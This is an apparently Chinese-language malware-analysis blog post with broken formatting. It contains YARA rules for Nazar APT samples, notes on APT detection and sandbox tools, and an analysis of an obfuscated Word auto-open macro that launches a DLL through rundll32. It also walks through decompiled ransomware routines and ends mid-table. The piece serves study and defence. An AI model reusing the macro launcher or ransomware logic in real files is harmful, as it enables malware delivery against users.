<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">   </span><br><span class="line"></span><br><span class="line">   Nazar APT样本分析之二</span><br><span class="line"></span><br><span class="line">2. ```</span><br><span class="line">   rule apt_ZZ_SIG37_NAZAR_GoDownDll</span><br><span class="line">   &#123;</span><br><span class="line">   	meta:</span><br><span class="line">   		desc = &quot;SIG37 Dropped TypeLibrary&quot;</span><br><span class="line">   		author = &quot;JAG-S&quot;		</span><br><span class="line">   		hash = &quot;8fb9a22b20a338d90c7ceb9424d079a61ca7ccb7f78ffb7d74d2f403ae9fbeec&quot; //??</span><br><span class="line">   	strings:</span><br><span class="line">   		$godown1 = /Godown [0-9.]&#123;1,4&#125; Type LibraryWWW/ ascii wide</span><br><span class="line">   		$godown2 = &quot;Godown.Shutdown.1&quot; ascii wide</span><br><span class="line">   		$godown3 = &quot;qGODOWNLibWWW&quot; ascii wide</span><br><span class="line">   </span><br><span class="line">   		$guid1 = &quot;&#123;772BA12D-8A62-4DD3-B3E8-92DA702E6F3D&#125;&quot; ascii wide //TypeLib reg</span><br><span class="line">   		$guid2 = &quot;&#123;B64E94AF-D56B-48B4-B178-AF0723E72AB5&#125;&quot; ascii wide //TypeLib reg</span><br><span class="line">   		$guid3 = &quot;&#123;DBCB4B31-21B8-4A0F-BC69-0C3CE3B66D00&#125;&quot; ascii wide</span><br><span class="line">   </span><br><span class="line">   		$shutdown1 = &quot;aShutdownd&quot; ascii wide</span><br><span class="line">   		$shutdown2 = &quot;IShutdownWWWd&quot; ascii wide</span><br><span class="line">   		$shutdown3 = &quot;IShutdown InterfaceWWW&quot; ascii wide</span><br><span class="line">   		$shutdown4 = &quot;method PowerOffWWW&quot; ascii wide		</span><br><span class="line">   		$shutdown5 = &quot;property TimeoutWW&quot; ascii wide</span><br><span class="line">   </span><br><span class="line">   	condition:</span><br><span class="line">   		uint16(0) == 0x5a4d</span><br><span class="line">   		and</span><br><span class="line">   		(</span><br><span class="line">   			any of ($godown*)</span><br><span class="line">   			or</span><br><span class="line">   			any of ($guid*)</span><br><span class="line">   			or</span><br><span class="line">   			2 of ($shutdown*)</span><br><span class="line">   		)</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>



 

</code></pre>
</li>
</ol>
<ul>
<li>Nazar APT 样本分析之三</li>
</ul>
<ol>
<li>
<pre><code>rule apt_ZZ_SIG37_NAZAR_Kzher_pdb
&#123;
	meta:
		desc = &quot;GoDown PDB Path&quot;
		author = &quot;JAG-S&quot;		
		hash = &quot;4d0ab3951df93589a874192569cac88f7107f595600e274f52e2b75f68593bca&quot;
		hash = &quot;d9801b4da1dbc5264e83029abb93e800d3c9971c650ecc2df5f85bcc10c7bd61&quot;
		hash = &quot;1110c3e34b6bbaadc5082fabbdd69f492f3b1480724b879a3df0035ff487fd6f&quot;
	strings:
		$pdb_spec = &quot;C:\\khzer\\DLLs\\DLL's Source\\&quot; ascii wide
		$pdb_gen = &quot;C:\\khzer\\&quot; ascii wide

	condition:
		uint16(0) == 0x5a4d
		and
		any of them
&#125;


rule apt_ZZ_SIG37_NAZAR_GpUpdates_Distribute
&#123;
	meta:
		desc = &quot;SIG37 GpUpdates unpacked distributor: Distribute.exe&quot;
		author = &quot;JAG-S&quot;
		hash = &quot;6b8ea9a156d495ec089710710ce3f4b1e19251c1d0e5b2c21bbeeab05e7b331f&quot;
		parent = &quot;d34a996826ea5a028f5b4713c797247913f036ca0063cc4c18d8b04736fa0b65&quot;
	strings:
		$uniq_filename1 = &quot;\\godown.dll&quot; ascii wide
		
		
		$common_filename1 = &quot;\\ViewScreen.dll&quot; ascii wide
		$common_filename2 = &quot;\\filesystem.dll&quot; ascii wide
		$common_filename3 = &quot;\\dllcache\\svchost.exe&quot; ascii wide
		$common_filename4 = &quot;\\lame_enc.dll&quot; ascii wide
		$common_filename5 = &quot;\\hodll.dll&quot; ascii wide

		$service1 = &quot;Provides basic host functionality&quot; ascii wide
		$service2 = &quot;EYService&quot; ascii wide
		$service3 = &quot;Windows Host Service&quot; ascii wide
	condition:
		uint16(0) == 0x5a4d
		and
		(
			any of ($uniq_filename*)
			or
			all of ($common_filename*)
			or
			(all of ($service*) and 3 of ($common_filename*))
		)
&#125;
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### APT攻击检测与防御</span><br><span class="line"></span><br></pre></td></tr></table></figure>
</code></pre>
</li>
</ol>
<p>1、 URL 异常检测，深度分析 URL 内 User-Agent 字段以及 HTTP 状态码来判断网站是否异常，以及网站中是否有恶意文件的下载链接，<br>
{host,user-agent}<br>
 2. Email 异常检测，通过对邮件的包头，发件人和邮件内附件或者链接检查，分析是否有恶意软件或链接存在。<br>
2、沙箱检测技术，模拟 Linux、Windows，Android 环境，将可以文件放在沙箱离模拟运行，通过自动观测、自动分析、自动警告发现未知威胁。沙箱同时又叫做沙盘，是一种 APT 攻击 核心防御技术，该技术在应用时能够创造一种 模拟化的环境来隔离本地系统中的注册表、内存以及对象，而实施系统访问、文件观察等可以通过虚拟环境来实施操作，同时沙箱能够利用定向技术在特定文件夹当中定向进行文件的 修改和生成，防止出现修改核心数据和真实注册表的现象，一旦系统受到 APT 攻击，实现的虚拟环境能够对特征码实施观察和分析，从而将攻击进行有效的防御。在实际应用过程中， 沙箱技术能够充分发挥防御作用，但是由于其消耗本地资料过多，导致工作处理过程周期过长，对此要进一步加强其应用效率的提升，从而有效区分和处理软件与文件，有效提升自身的应用效率，充分防御来自于外界的 APT 攻击。<br>
3、信誉技术，安全信誉主要是评估互联网资源和有关服务主体在安全性能方面的指数和表现，而信誉技术在应用过程中能够以一种辅助的方式来检测 APT 攻击，并针对性建设信誉数据库，其中包括威胁情报库、僵尸网络地址库、文件 MD5 码库以及 WEB URL 信誉库，能够作为辅助支撑技术帮助系统提升检测 APT 攻击， 比如常见的木马病毒和新型病毒等，一旦遇到不良信誉资源能够利用网络安全设备进行过滤和阻断。在此过程中，信誉库能够充分发挥自 身优势，有效保护系统相关数据和信息，提升 安全产品的安全防护指数，依照实际情况来分析，信誉技术已经广泛应用到网络类安全产品当中，并且通过安全信誉评估策略服务和信誉过滤器等功能为信息系统的安全提供有效保 障。<br>
4、异常流量分析技术，异常流量分析技术在应用过程中主要以一种流量检测方式和分析方式对有关流量信息实施提取，并且针对其中的带宽占用、CPU/ RAM、物理路径、IP 路由、标志位、端口、 协议、帧长、帧数等实施有效的监视和检测，并且融入节点、拓扑和时间等分析手段来统计 流量异常、流量行为等可能出现的异常信息， 从而依照分析的结果和数据来对可能出现的 0 DAY 漏洞攻击进行准确识别。同时，异常流量分析技术进一步融入了机器学习技术和统计学技术，能够以科学化、合理化的方式来对模型实施建立。与传统的网络防御技术相比，异常流量分析技术能够充分发挥自身优势，以一 种数据采集机制来保护原有系统，并且对出现的异常行为进行有效的追踪，分析历史流量数据，从而有效确定异常流量点，最终起到防御 APT 攻击的目的。<br>
5、大数据分析技术在防御 APT 攻击时，要充分发挥大数据分析技术的优势，针对网络系统中出现的日志 数据和 SOC 安全管理平台中出现的日志数据， 利用大数据分析技术能够实施有效的分析和研 究，并通过态势分析、数据挖掘、数据统计技术，对大量历史数据进行分析，获取其中存在的 APT 攻击痕迹，从而以一种弥补方式来对 传统安全防御技术实施加强。同时，大数据分析技术要想发挥自身作用，需要提升自身数据分析和数据采集能力，并积极融合全自动相应系统，从而快速监控不同区域中的数据信息， 改变出现的信息孤岛所导致的调查分析问题。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### 配置Buster Sandbox自动化沙盘检测方式</span><br><span class="line"></span><br><span class="line">1. 1.win XP虚拟机一台（win 7也可）</span><br><span class="line"></span><br><span class="line">   2.sandboxie 沙盒计算机程序</span><br><span class="line"></span><br><span class="line">   Sandboxie是一个沙盒计算机程序，由Ronen Tzur开发，可以在32位及64位的、基于Windows NT的系统上运行（如Windows XP、Windows 7等）。Sandboxie会在系统中虚拟出一块与系统完全隔离的空间，称之为沙箱环境，在这个沙盘环境内，运行的一切程序都不会对原操作系统产生影响。Sandboxie的本意是提供安全的Web浏览以及增强隐私，但是它的许多特性使用得它非常适合进行恶意软件分析。</span><br><span class="line"></span><br><span class="line">   3.BSA（Buster Sandbox Analysis）</span><br><span class="line"></span><br><span class="line">   BSA是一款监控沙箱内进程行为的工具。通过分析程序行为对系统环境造成的影响，确定程序是否为恶意软件。通过对BSA和Sandboxie的配置，可以监控程序对文件系统、注册表、端口甚至API调用序列等的操作。</span><br><span class="line"></span><br><span class="line">   4.winpcap</span><br><span class="line"></span><br><span class="line">   Winpcap(windows packet capture)是Windows平台下一个免费、公共的网络访问系统，它为win32应用程序提供访问网络底层的能力，Winpcap不阻塞、过滤或控制其他应用程序数据报的发收，它仅仅只是监听共享网络上传送的数据报。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### APT分析-在线云沙盘分析系统</span><br><span class="line"></span><br><span class="line">1. 火眼（https://fireeye.ijinshan.com）</span><br><span class="line"></span><br><span class="line">   ​    火眼是国内的一个在线文件分析站点，由金山公司开发。在这里，你可以提交自己的文件进行分析，目前支持30MB以下的APK,EXE,DLL,BAT,HTML,JS,VBS,MSI和特定格式的压缩包。对于新提交的文件，会首先获取文件的MD5，sha-1签名，与已检测的文件数据库中的数据进行对比，如果已经存在，则会提示选择是重新分析还是查看最近一次分析结果。 另外，还可以查看已存在的其它文件的分析报告。 报告中的信息包括文件的基本信息（文件名，大小，类型，时间，MD5，SHA-1），点评，危险行为，其它行为（文件操作，注册表操作，进程操作，网络访问，还有运行截图）。</span><br><span class="line"></span><br><span class="line">   ​     这貌似是国内唯一的一个对外公开的在线沙盒，最重要的是免费。只要回答注册然后回答几个问题就可以使用。而且还是中文的看着舒服。而且还有关键行为的时间轴报告，看起来比较简单明了。总体来说，就是简单方便，但是专业性可能略显不足。 如果再说一个优点的话，就是不用翻墙</span><br><span class="line"></span><br><span class="line">   ​     再来介绍几个国外的。</span><br><span class="line"></span><br><span class="line">   2 VIRUSTOTAL(www.virustotal.com)</span><br><span class="line"></span><br><span class="line">   ​    VirusTotal是一个免费的病毒，蠕虫，木马和各种恶意软件分析服务。可以针对可疑文件和网址进行快速检测。 最大文件大小为64M。文件上传后会先计算哈希值，与已检测的文件数据库中的数据进行对比，如果已经存在，则会提示选择是重新分析还是查看最近一次分析结果。 分析报告中，包括病毒检出率（51个杀毒引擎查杀）文件详细信息（文件头，字符串，环境变量，运行时库），文件操作，网络操作（HTTP,DNS,TCP,UDP)，进程操作，互斥体，HOOK，窗口操作.</span><br><span class="line"></span><br><span class="line">   ​     不得不承认，VirusTotal做的比国内的火眼专业很多，各种信息记录的更加详尽，不仅记录了各种操作，并且记载了他们的执行是否成功，并且对各种信息进行了更加细致的分类。你几乎可以找到所有你想要找的除了源代码之外的文件信息和行为记录。而且速度在国外网站中算是比较快的了，不过还是需要用VPN。再有就是只能上传自己的文件，或者根据MD5，URL,IP等信息来查询报告，而没有一个索引来查看所有报告。这个其实也算不上缺点，只能说是小小的不足。总归瑕不掩瑜，这个网站绝对称得上专业两个字。</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">   3 ThreatExpert（http://www.threatexpert.com）</span><br><span class="line"></span><br><span class="line">   ​     ThreatExpert is an advanced automated threat analysis system designed to analyze and report the behavior of computer viruses, worms, trojans, adware, spyware, and other security-related risks in a fully automated mode.In only a few minutes ThreatExpert can process a sample and generate a highly detailed threat report with the level of technical detail that matches or exceeds antivirus industry standards such as those normally found in online virus encyclopedias.</span><br><span class="line"></span><br><span class="line">   4 Anubis（http://anubis.iseclab.org）</span><br><span class="line"></span><br><span class="line">   ​     Anubis（阿努比斯）也是一个恶意软件分析的服务器，可以提交URL和文件进行分析，分析报告可以选择HTML,XML,PDF,TXT,PDF五种格式，报告中包含了测试文件及其释放文件的文件操作，网络操作，注册表操作等信息。并且对这些操作进行了细分。</span><br><span class="line"></span><br><span class="line">   5 joe（http://www.joesecurity.org）</span><br><span class="line"></span><br><span class="line">   ​     这个貌似没有找到提交文件的地方，但是上面有一些已经存在的报告。报告的信息特别全。与之对应的，打开的速度就稍微慢了一些。但是内容真的是特别的多，只有你想不到，没有你找不到。不过看着最新的一个样本是两个月之前的。而且貌似是两个月左右更新一次。作为学习之用应该是非常不错的。</span><br><span class="line"></span><br><span class="line">   ### APT分析-开源沙箱分析系统</span><br><span class="line"></span><br><span class="line">   在工作中很多时候需要自己对一些可以程序，可执行文件进行检测，当然我们可以通过VT，微步，等一些开源的平台进行检测。现在我们通过自己搭建的开源的沙箱进行检测。所谓沙箱，是分离运行程序的一种安全机制。他通常用于执行未经测试的代码，或来自第三方、供应商、不可信网站等的不可信程序。我们可以通过沙箱在一个隔离的环境运行，不可信程序，并且获取他做的信息。</span><br><span class="line"></span><br><span class="line">   恶意软件分析一般分为两种:静态分析和动态分析。沙箱是动态分析的应用，它不静态分析二进制文件，实时执行并且监控恶意软件。这可以帮助安全分析人员获取不可信软件的细节，比如网络行为等，静态和动态分析不可信程序。生成的结果可以更快帮助我们对恶意软件进行分析。</span><br><span class="line"></span><br><span class="line">   1.2 关于Cuckoo</span><br><span class="line"></span><br><span class="line">   Cuckoo是一个开源的自动恶意软件分析系统,我们可以用它来自动运行和分析文件，并可以获取到全面的分析结果，</span><br><span class="line"></span><br><span class="line">   Cuckoo 可以获取以下类型结果:</span><br><span class="line"></span><br><span class="line">   1.追踪由恶意软件产生的所有进程执行的调用</span><br><span class="line"></span><br><span class="line">   2.恶意软件在执行中增删改查情况</span><br><span class="line"></span><br><span class="line">   3.恶意软件进程的内存输出</span><br><span class="line"></span><br><span class="line">   4.PCAP包格式的网络流量跟踪</span><br><span class="line"></span><br><span class="line">   5.在执行软件关键截图</span><br><span class="line"></span><br><span class="line">   6.机器全部内存输出 </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1.3 Cuckoo模块和可分析样本类型:</span><br><span class="line">  • Generic Windows executables</span><br><span class="line">  • DLL files</span><br><span class="line">  • PDF documents</span><br><span class="line">  • Microsoft Office documents</span><br><span class="line">  • URLs and HTML files</span><br><span class="line">  • PHP scripts</span><br><span class="line">  • CPL files</span><br><span class="line">  • Visual Basic (VB) scripts</span><br><span class="line">  • ZIP files</span><br><span class="line">  • Java JAR</span><br><span class="line">  • Python files</span><br><span class="line">  • Almost anything else</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>git clone <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2JsYWNrdG9wL2RvY2tlci1jdWNrb28=">https://github.com/blacktop/docker-cuckoo</span><br>
cd docker-cuckoo<br>
docker-compose up -d<br>
For docker-machine<br>
curl $(docker-machine ip):8000/cuckoo/status<br>
For Docker for Mac<br>
curl localhost:8000/cuckoo/status</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### APT-Safebits 恶意样本之调试方法</span><br><span class="line"></span><br><span class="line">OD附加winword进程</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### APT-Safebits 恶意样本之宏命令</span><br><span class="line"></span><br><span class="line">office中vba命令</span><br><span class="line"></span><br><span class="line">Microsoft 对象，this document定义了函数</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>Private Sub Document_Open()<br>
Call stetptwwo<br>
End Sub</p>
<p>Sub stetptwwo()</p>
<p>Dim yy As String</p>
<p>Dim vxcv As Integer<br>
Dim hugs As Integer<br>
hugs = chek</p>
<p>Dim ede As String<br>
If hugs = 1 Then<br>
Else<br>
Dim edef As String</p>
<p>Call hhhhh<br>
Dim pushstr As String<br>
pushstr = “\W” &amp; “0r” &amp; “d.d”<br>
Dim geto As String<br>
Dim pus As String<br>
pus = “xe”<br>
geto = “nd”<br>
Dim ter As String</p>
<p>Dim iof As String<br>
iof = “3”<br>
ter = “e”<br>
Dim jsd As String<br>
jsd = geto<br>
Dim hh As String<br>
hh = iof &amp; “2.” &amp; ter &amp; pus<br>
Dim fps As String<br>
fps = “r”<br>
Dim gpsa As String<br>
gpsa = “,Unin”<br>
Dim fa As String<br>
fa = fps &amp; “u” &amp; jsd &amp; “ll” &amp; hh<br>
Dim glops As String<br>
glops = repid<br>
Dim regsrva As New Shell32.Shell<br>
yy = glops &amp; yy &amp; pushstr &amp; “ll” &amp; gpsa &amp; “stallFont”</p>
<p>Call regsrva.ShellExecute(fa, yy, &quot; &quot;, SW_SHOWNORMAL)<br>
End If<br>
End Sub</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">doc后缀可以改为zip解压后就可以解析其中的内容</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### dump内存</span><br><span class="line"></span><br><span class="line">使用hxd</span><br><span class="line"></span><br><span class="line">从指定偏移dump对应的字节数，复制到新的文件</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## 勒索病毒</span><br><span class="line"></span><br><span class="line">勒索病毒文件一旦进入本地，就会自动运行，同时删除勒索软件样本，以躲避查杀和分析。接下来，勒索病毒利用本地的互联网访问权限连接至黑客的C&amp;C服务器，进而上传本机信息并下载加密私钥与公钥，利用私钥和公钥对文件进行加密。除了病毒开发者本人，其他人是几乎不可能解密。加密完成后，还会修改壁纸，在桌面等明显位置生成勒索提示文件，指导用户去缴纳赎金。且变种类型非常快，对常规的杀毒软件都具有免疫性。攻击的样本以exe、js、wsf、vbe等类型为主，对常规依靠特征检测的安全产品是一个极大的挑战。 </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1.程序获取当前路径</span><br><span class="line"></span><br><span class="line">![image-20231009191624078](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231009191624078.png) </span><br><span class="line"></span><br><span class="line">执行结束后pathbuffer中</span><br><span class="line"></span><br><span class="line">![image-20231009191909287](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231009191909287.png) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">40f8ac是全局变量，将其先入栈，后面的call会对他赋值</span><br><span class="line"></span><br><span class="line">![image-20231009191930103](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231009191930103.png) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">call 401225 中，先获取了计算机名字和长度，接着使用加密算法计算出了一个字符串：</span><br><span class="line"></span><br><span class="line">![image-20231009192057088](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231009192057088.png) </span><br><span class="line"></span><br><span class="line">![image-20231009192748738](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231009192748738.png) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">取出路径的最后一段，以\分割，最后获取的为32131231.exe</span><br><span class="line"></span><br><span class="line">![image-20231009193000324](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231009193000324.png) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">写注册表，作为是否重复感染的依据</span><br><span class="line"></span><br><span class="line">![image-20231009193304108](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231009193304108.png) </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>signed int __cdecl sub_4010FD(int a1)<br>
{<br>
size_t v1; // eax@7<br>
int v2; // esi@7<br>
LSTATUS v3; // eax@8<br>
CHAR Buffer; // [sp+8h] [bp-2DCh]@1<br>
char v6; // [sp+9h] [bp-2DBh]@1<br>
__int16 v7; // [sp+20Dh] [bp-D7h]@1<br>
char v8; // [sp+20Fh] [bp-D5h]@1<br>
wchar_t Dest; // [sp+210h] [bp-D4h]@1<br>
char v10; // [sp+224h] [bp-C0h]@1<br>
DWORD cbData; // [sp+2D8h] [bp-Ch]@8<br>
int v12; // [sp+2DCh] [bp-8h]@1<br>
HKEY phkResult; // [sp+2E0h] [bp-4h]@1</p>
<p>qmemcpy(&amp;Dest, aSoftware, 0x14u);<br>
Buffer = 0;<br>
phkResult = 0;<br>
memset(&amp;v10, 0, 0xB4u);<br>
memset(&amp;v6, 0, 0x204u);<br>
v7 = 0;<br>
v8 = 0;<br>
wcscat(&amp;Dest, Source);<br>
v12 = 0;<br>
while ( 1 )<br>
{<br>
if ( v12 )<br>
RegCreateKeyW(HKEY_CURRENT_USER, &amp;Dest, &amp;phkResult);<br>
else<br>
RegCreateKeyW(HKEY_LOCAL_MACHINE, &amp;Dest, &amp;phkResult);<br>
if ( phkResult )<br>
{<br>
if ( a1 )<br>
{<br>
GetCurrentDirectoryA(0x207u, &amp;Buffer);<br>
v1 = strlen(&amp;Buffer);<br>
v2 = RegSetValueExA(phkResult, ValueName, 0, 1u, (const BYTE *)&amp;Buffer, v1 + 1) == 0;<br>
}<br>
else<br>
{<br>
cbData = 519;<br>
v3 = RegQueryValueExA(phkResult, ValueName, 0, 0, (LPBYTE)&amp;Buffer, &amp;cbData);<br>
v2 = v3 == 0;<br>
if ( !v3 )<br>
SetCurrentDirectoryA(&amp;Buffer);<br>
}<br>
RegCloseKey(phkResult);<br>
if ( v2 )<br>
break;<br>
}<br>
++v12;<br>
if ( v12 &gt;= 2 )<br>
return 0;<br>
}<br>
return 1;<br>
}</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![image-20231009193613091](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231009193613091.png) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">生成压缩包</span><br><span class="line"></span><br><span class="line">![image-20231009194302116](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231009194302116.png) </span><br><span class="line"></span><br><span class="line">位置为4100f0，大小为349635</span><br><span class="line"></span><br><span class="line">![image-20231009194335290](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231009194335290.png) </span><br><span class="line"></span><br><span class="line">![image-20231009194348280](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231009194348280.png) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">存储了三个不同的钱包</span><br><span class="line"></span><br><span class="line">![image-20231009195034297](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231009195034297.png) </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>int sub_401E9E()<br>
{<br>
int result; // eax@1<br>
int v1; // eax@2<br>
char DstBuf; // [sp+0h] [bp-318h]@1<br>
char Dest; // [sp+B2h] [bp-266h]@2<br>
char *Source; // [sp+30Ch] [bp-Ch]@1<br>
int v5; // [sp+310h] [bp-8h]@1<br>
int v6; // [sp+314h] [bp-4h]@1</p>
<p>Source = a13am4vw2dhxygx;<br>
v5 = (int)a12t9ydpgwuez9n;<br>
v6 = (int)a115p7ummngoj1p;<br>
result = sub_401000(&amp;DstBuf, 1);<br>
if ( result )<br>
{<br>
v1 = rand();<br>
strcpy(&amp;Dest, (&amp;Source)[4 * (v1 % 3)]);<br>
result = sub_401000(&amp;DstBuf, 0);<br>
}<br>
return result;<br>
}</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span 